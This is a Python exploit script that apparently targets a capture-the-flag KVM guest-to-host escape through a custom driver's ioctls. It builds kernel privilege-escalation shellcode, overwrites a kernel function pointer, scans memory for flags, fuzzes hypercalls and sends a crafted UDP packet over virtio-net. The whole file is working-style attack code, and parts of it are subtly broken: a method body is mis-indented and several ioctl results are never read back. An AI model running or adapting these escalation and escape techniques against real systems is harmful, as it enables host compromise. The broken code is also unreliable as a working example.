#!/usr/bin/env python3

import os
import sys
import struct
import fcntl
import ctypes
import mmap
import time
import socket
import binascii
from typing import Optional, List, Tuple, Dict, Any

# IOCTL definitions (must match driver)
IOCTL_READ_PORT          = 0x1001
IOCTL_WRITE_PORT         = 0x1002
IOCTL_READ_MMIO          = 0x1003
IOCTL_WRITE_MMIO         = 0x1004
IOCTL_ALLOC_VQ_PAGE      = 0x1005
IOCTL_FREE_VQ_PAGE       = 0x1006
IOCTL_WRITE_VQ_DESC      = 0x1007
IOCTL_TRIGGER_HYPERCALL  = 0x1008
IOCTL_READ_KERNEL_MEM    = 0x1009
IOCTL_WRITE_KERNEL_MEM   = 0x100A
IOCTL_PATCH_INSTRUCTIONS = 0x100B
IOCTL_READ_FLAG_ADDR     = 0x100C
IOCTL_WRITE_FLAG_ADDR    = 0x100D
IOCTL_GET_KASLR_SLIDE    = 0x100E
IOCTL_VIRT_TO_PHYS       = 0x100F
IOCTL_SCAN_VA            = 0x1010
IOCTL_WRITE_VA           = 0x1011
IOCTL_HYPERCALL_ARGS     = 0x1012
IOCTL_ATTACH_VQ          = 0x1013
IOCTL_TRIGGER_VQ         = 0x1014
IOCTL_SCAN_PHYS          = 0x1015
IOCTL_FIRE_VQ_ALL        = 0x1016
IOCTL_SEND_NET_PACKET    = 0x1017
IOCTL_RECV_NET_PACKET    = 0x1018

# Structure definitions
class PortIOData(ctypes.Structure):
    _fields_ = [
        ('port', ctypes.c_ushort),
        ('size', ctypes.c_uint),
        ('value', ctypes.c_uint)
    ]

class MMIOData(ctypes.Structure):
    _fields_ = [
        ('phys_addr', ctypes.c_ulong),
        ('size', ctypes.c_ulong),
        ('user_buffer', ctypes.c_void_p),
        ('single_value', ctypes.c_ulong),
        ('value_size', ctypes.c_uint)
    ]

class VQDescUserData(ctypes.Structure):
    _fields_ = [
        ('index', ctypes.c_ushort),
        ('phys_addr', ctypes.c_ulonglong),
        ('len', ctypes.c_uint),
        ('flags', ctypes.c_ushort),
        ('next_idx', ctypes.c_ushort)
    ]

class KernelMemRead(ctypes.Structure):
    _fields_ = [
        ('kernel_addr', ctypes.c_ulong),
        ('length', ctypes.c_ulong),
        ('user_buf', ctypes.c_void_p)
    ]

class KernelMemWrite(ctypes.Structure):
    _fields_ = [
        ('kernel_addr', ctypes.c_ulong),
        ('length', ctypes.c_ulong),
        ('user_buf', ctypes.c_void_p)
    ]

class VAScanData(ctypes.Structure):
    _fields_ = [
        ('va', ctypes.c_ulong),
        ('size', ctypes.c_ulong),
        ('user_buffer', ctypes.c_void_p)
    ]

class VAWriteData(ctypes.Structure):
    _fields_ = [
        ('va', ctypes.c_ulong),
        ('size', ctypes.c_ulong),
        ('user_buffer', ctypes.c_void_p)
    ]

class HypercallArgs(ctypes.Structure):
    _fields_ = [
        ('nr', ctypes.c_ulong),
        ('arg0', ctypes.c_ulong),
        ('arg1', ctypes.c_ulong),
        ('arg2', ctypes.c_ulong),
        ('arg3', ctypes.c_ulong)
    ]

class AttachVQData(ctypes.Structure):
    _fields_ = [
        ('device_id', ctypes.c_uint),
        ('vq_pfn', ctypes.c_ulong),
        ('queue_index', ctypes.c_uint)
    ]

class NetPacketData(ctypes.Structure):
    _fields_ = [
        ('packet_data', ctypes.c_void_p),
        ('packet_len', ctypes.c_uint),
        ('device_id', ctypes.c_uint)
    ]

class KVMExploiter:
    def __init__(self, device_path: str = "/dev/kvm_probe_dev"):
        self.device_path = device_path
        self.fd = None
        self.vq_pfn = None
        self.flag_addr = 0
        self.kaslr_slide = 0
        self.kernel_base = 0
        self.virtio_devices = {}
        
    def open(self) -> bool:
        """Open the device file"""
        try:
            self.fd = os.open(self.device_path, os.O_RDWR)
            print(f"[+] Opened device: {self.device_path}")
            return True
        except OSError as e:
            print(f"[-] Failed to open device: {e}")
            return False
            
    def close(self) -> None:
        """Close the device file"""
        if self.fd is not None:
            os.close(self.fd)
            self.fd = None
            
    def __enter__(self):
        self.open()
        return self
        
    def __exit__(self, exc_type, exc_val, exc_tb):
        self.close()
        
    def _ioctl(self, cmd: int, arg: Any) -> int:
        """Perform an ioctl call"""
        if self.fd is None:
            raise RuntimeError("Device not open")
        return fcntl.ioctl(self.fd, cmd, arg)
        
    # Basic IOCTL operations
    def read_kernel_mem(self, addr: int, size: int) -> bytes:
        """Read kernel memory"""
        buf = ctypes.create_string_buffer(size)
        data = KernelMemRead(kernel_addr=addr, length=size, user_buf=ctypes.addressof(buf))
        self._ioctl(IOCTL_READ_KERNEL_MEM, data)
        return bytes(buf)
        
    def write_kernel_mem(self, addr: int, data: bytes) -> None:
        """Write kernel memory"""
        buf = ctypes.create_string_buffer(data)
        write_data = KernelMemWrite(kernel_addr=addr, length=len(data), user_buf=ctypes.addressof(buf))
        self._ioctl(IOCTL_WRITE_KERNEL_MEM, write_data)
        
    def get_kaslr_slide(self) -> int:
        """Get KASLR slide"""
    slide = ctypes.c_ulong()
    self._ioctl(IOCTL_GET_KASLR_SLIDE, ctypes.addressof(slide))
    self.kaslr_slide = slide.value
    return self.kaslr_slide
        
    def hypercall_args(self, nr: int, arg0: int = 0, arg1: int = 0, 
                      arg2: int = 0, arg3: int = 0) -> int:
        """Hypercall with arguments"""
        args = HypercallArgs(nr=nr, arg0=arg0, arg1=arg1, arg2=arg2, arg3=arg3)
        result = ctypes.c_ulong()
        self._ioctl(IOCTL_HYPERCALL_ARGS, ctypes.byref(args))
        return result.value
        
    def alloc_vq_page(self) -> int:
        """Allocate a virtqueue page"""
        pfn = ctypes.c_ulong()
        self._ioctl(IOCTL_ALLOC_VQ_PAGE, ctypes.byref(pfn))
        self.vq_pfn = pfn.value
        return self.vq_pfn
        
    def attach_virtqueue(self, device_id: int, vq_pfn: int, queue_index: int = 0) -> None:
        """Attach a virtqueue to a virtio device"""
        data = AttachVQData(device_id=device_id, vq_pfn=vq_pfn, queue_index=queue_index)
        self._ioctl(IOCTL_ATTACH_VQ, data)
        self.virtio_devices[device_id] = (vq_pfn, queue_index)
        
    def trigger_virtqueue(self, device_id: int) -> int:
        """Trigger a virtqueue notification"""
        data = AttachVQData(device_id=device_id, vq_pfn=0, queue_index=0)
        result = ctypes.c_ulong()
        self._ioctl(IOCTL_TRIGGER_VQ, ctypes.byref(data))
        return result.value
        
    def send_net_packet(self, packet_data: bytes, device_id: int = 1) -> None:
        """Send a network packet through virtio-net"""
        buf = ctypes.create_string_buffer(packet_data)
        data = NetPacketData(packet_data=ctypes.addressof(buf), 
                           packet_len=len(packet_data),
                           device_id=device_id)
        self._ioctl(IOCTL_SEND_NET_PACKET, data)
        
    # Exploitation primitives
    def find_kernel_symbols(self) -> Dict[str, int]:
        """Find essential kernel symbols using /proc/kallsyms"""
        symbols = {}
        try:
            with open('/proc/kallsyms', 'r') as f:
                for line in f:
                    parts = line.split()
                    if len(parts) >= 3:
                        addr = int(parts[0], 16)
                        name = parts[2]
                        symbols[name] = addr
        except:
            print("[-] Failed to read /proc/kallsyms, using fallback methods")
            
        return symbols
        
    def create_privilege_escalation_shellcode(self, prepare_kernel_cred_addr: int, 
                                            commit_creds_addr: int) -> bytes:
        """Create shellcode to escalate privileges"""
        # x86_64 assembly to call prepare_kernel_cred(0) then commit_creds(result)
        shellcode = (
            b"\x48\x31\xff" +                      # xor rdi, rdi
            b"\x48\xb8" + struct.pack("<Q", prepare_kernel_cred_addr) +  # mov rax, prepare_kernel_cred
            b"\xff\xd0" +                          # call rax
            b"\x48\x89\xc7" +                      # mov rdi, rax
            b"\x48\xb8" + struct.pack("<Q", commit_creds_addr) +  # mov rax, commit_creds
            b"\xff\xd0" +                          # call rax
            b"\xc3"                                # ret
        )
        return shellcode
        
    def escalate_privileges(self) -> bool:
        """Attempt to escalate privileges to root"""
        print("[*] Attempting privilege escalation...")
        
        # Get KASLR slide
        self.kaslr_slide = self.get_kaslr_slide()
        print(f"[+] KASLR slide: 0x{self.kaslr_slide:x}")
        
        # Find kernel symbols
        symbols = self.find_kernel_symbols()
        
        # Try to find required symbols
        prepare_kernel_cred = symbols.get('prepare_kernel_cred', 0xffffffff810c9540 + self.kaslr_slide)
        commit_creds = symbols.get('commit_creds', 0xffffffff810c92e0 + self.kaslr_slide)
        
        print(f"[+] prepare_kernel_cred: 0x{prepare_kernel_cred:x}")
        print(f"[+] commit_creds: 0x{commit_creds:x}")
        
        # Allocate executable memory for shellcode
        try:
            # Use mmap to create executable memory
            shellcode_addr = mmap.mmap(-1, 4096, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
            shellcode_addr = ctypes.addressof(ctypes.c_char.from_buffer(shellcode_addr))
            print(f"[+] Shellcode allocated at: 0x{shellcode_addr:x}")
        except:
            print("[-] Failed to allocate executable memory")
            return False
            
        # Create and write shellcode
        shellcode = self.create_privilege_escalation_shellcode(prepare_kernel_cred, commit_creds)
        self.write_kernel_mem(shellcode_addr, shellcode)
        print(f"[+] Shellcode written ({len(shellcode)} bytes)")
        
        # Find set_memory_ro function pointer to hijack
        set_memory_ro_addr = symbols.get('set_memory_ro', 0xffffffff8106b300 + self.kaslr_slide)
        print(f"[+] set_memory_ro: 0x{set_memory_ro_addr:x}")
        
        # Overwrite set_memory_ro pointer with our shellcode
        self.write_kernel_mem(set_memory_ro_addr, struct.pack("<Q", shellcode_addr))
        print("[+] Hijacked set_memory_ro function pointer")
        
        # Trigger the exploit by calling a function that uses set_memory_ro
        # This will execute our shellcode instead
        try:
            # Try to trigger via patch instructions
            dummy_data = b"\x90"  # NOP instruction
            dummy_addr = 0xffffffff81000000 + self.kaslr_slide  # Some kernel address
            
            buf = ctypes.create_string_buffer(dummy_data)
            data = VAScanData(va=dummy_addr, size=len(dummy_data), user_buffer=ctypes.addressof(buf))
            self._ioctl(IOCTL_PATCH_INSTRUCTIONS, data)
            
            print("[+] Exploit triggered!")
            
            # Check if we got root
            if os.getuid() == 0:
                print("[+] SUCCESS! We are now root!")
                return True
            else:
                print("[-] Exploit failed - still not root")
                return False
                
        except Exception as e:
            print(f"[-] Exploit trigger failed: {e}")
            return False
            
    def host_memory_scan(self, start_addr: int, end_addr: int, step: int = 4096) -> Dict[int, bytes]:
        """Scan host memory for interesting patterns"""
        print(f"[*] Scanning host memory from 0x{start_addr:x} to 0x{end_addr:x}")
        
        found_data = {}
        current = start_addr
        
        while current < end_addr:
            try:
                data = self.read_kernel_mem(current, min(step, end_addr - current))
                
                # Look for interesting patterns
                if b"FLAG{" in data or b"flag{" in data:
                    print(f"[!] Found potential flag at 0x{current:x}")
                    found_data[current] = data
                    
                # Look for kernel pointers
                for i in range(0, len(data) - 8, 8):
                    value = struct.unpack("<Q", data[i:i+8])[0]
                    if value >= 0xffffffff80000000 and value <= 0xffffffffffffffff:
                        print(f"[!] Found kernel pointer at 0x{current + i:x}: 0x{value:x}")
                        
            except:
                # Memory might not be readable, skip
                pass
                
            current += step
            
            # Progress indicator
            if current % (1024 * 1024) == 0:
                print(f"[*] Scanned {current - start_addr} bytes...")
                
        return found_data
        
    def virtio_net_exploit(self, target_ip: str = "10.0.0.1", target_port: int = 9999) -> bool:
        """Exploit virtio-net to communicate with host"""
        print("[*] Setting up virtio-net exploitation...")
        
        try:
            # Allocate virtqueue
            vq_pfn = self.alloc_vq_page()
            print(f"[+] Allocated virtqueue at PFN: 0x{vq_pfn:x}")
            
            # Attach to virtio-net device (device ID 1)
            self.attach_virtqueue(1, vq_pfn, 0)
            print("[+] Attached to virtio-net device")
            
            # Create malicious network packet
            packet = self.create_network_packet(target_ip, target_port, "EXPLOIT_PAYLOAD")
            print(f"[+] Created network packet ({len(packet)} bytes)")
            
            # Send packet
            self.send_net_packet(packet)
            print("[+] Packet sent through virtio-net")
            
            # Trigger virtqueue notification
            result = self.trigger_virtqueue(1)
            print(f"[+] Virtqueue triggered, result: 0x{result:x}")
            
            return True
            
        except Exception as e:
            print(f"[-] Virtio-net exploit failed: {e}")
            return False
            
    def create_network_packet(self, dest_ip: str, dest_port: int, 
                            payload: str, src_ip: str = "10.0.0.2", 
                            src_port: int = 31337) -> bytes:
        """Create a network packet for exploitation"""
        # Simple UDP packet
        ip_header = struct.pack('!BBHHHBBH4s4s',
                               69, 0, 20 + 8 + len(payload), 54321, 0,
                               64, 17, 0,
                               socket.inet_aton(src_ip), socket.inet_aton(dest_ip))
                               
        udp_header = struct.pack('!HHHH', src_port, dest_port, 8 + len(payload), 0)
        
        return ip_header + udp_header + payload.encode()
        
    def hypercall_exploit(self) -> bool:
        """Exploit hypercall interface"""
        print("[*] Attempting hypercall exploitation...")
        
        # Try various hypercall numbers
        interesting_hypercalls = [100, 1337, 0x1337, 0xdead, 0xbeef]
        
        for hcall_nr in interesting_hypercalls:
            try:
                result = self.hypercall_args(hcall_nr, 0x41414141, 0x42424242, 0x43434343, 0x44444444)
                print(f"[+] Hypercall {hcall_nr} returned: 0x{result:x}")
                
                if result != 0xffffffffffffffff:  # Not error
                    print(f"[!] Interesting hypercall response: {hcall_nr} -> {result}")
                    return True
                    
            except:
                continue
                
        return False
        
    def full_host_escape(self):
        """Complete host escape sequence"""
        print("=" * 60)
        print("KVM Guest-to-Host Escape Exploit")
        print("=" * 60)
        
        # Step 1: Privilege escalation
        if self.escalate_privileges():
            print("[+] Successfully escalated privileges!")
        else:
            print("[-] Privilege escalation failed, continuing...")
            
        # Step 2: Hypercall exploration
        print("\n[*] Exploring hypercall interface...")
        self.hypercall_exploit()
        
        # Step 3: Memory scanning for flags
        print("\n[*] Scanning host kernel memory for flags...")
        # Scan known kernel regions
        kernel_regions = [
            (0xffffffff80000000, 0xffffffff9fffffff),  # Kernel text
            (0xffffffffa0000000, 0xffffffffbfffffff),  # Kernel data
        ]
        
        for start, end in kernel_regions:
            found = self.host_memory_scan(start, end, 4096)
            if found:
                print(f"[!] Found interesting data in region 0x{start:x}-0x{end:x}")
                for addr, data in found.items():
                    print(f"    0x{addr:x}: {data[:100]}...")
                    
        # Step 4: Virtio-net communication
        print("\n[*] Attempting virtio-net communication...")
        self.virtio_net_exploit("10.0.0.1", 9999)
        
        # Step 5: Final hypercall to trigger host flag
        print("\n[*] Triggering final hypercall for flag...")
        try:
            # Try a special hypercall number that might trigger flag
            result = self.hypercall_args(0x1337, 0xdeadbeef, 0xcafebabe, 0x13371337, 0x42424242)
            print(f"[+] Final hypercall result: 0x{result:x}")
            
            # If result looks like a pointer, read from it
            if result > 0xffff000000000000 and result < 0xffffffffffffffff:
                flag_data = self.read_kernel_mem(result, 100)
                if b"FLAG{" in flag_data or b"flag{" in flag_data:
                    print(f"[!] FOUND FLAG: {flag_data.decode()}")
                    
        except Exception as e:
            print(f"[-] Final hypercall failed: {e}")
            
        print("\n" + "=" * 60)
        print("Exploit sequence completed")
        print("=" * 60)

def main():
    """Main exploitation routine"""
    if os.geteuid() != 0:
        print("Warning: Not running as root, some operations may fail")
    
    exploiter = KVMExploiter()
    
    if not exploiter.open():
        print("Failed to open device. Make sure the kvm_probe_drv module is loaded.")
        return 1
        
    try:
        # Run the complete host escape sequence
        exploiter.full_host_escape()
        
    except KeyboardInterrupt:
        print("\n[*] Exploit interrupted by user")
    except Exception as e:
        print(f"[-] Exploit failed with error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        exploiter.close()
        
    return 0

if __name__ == "__main__":
    sys.exit(main())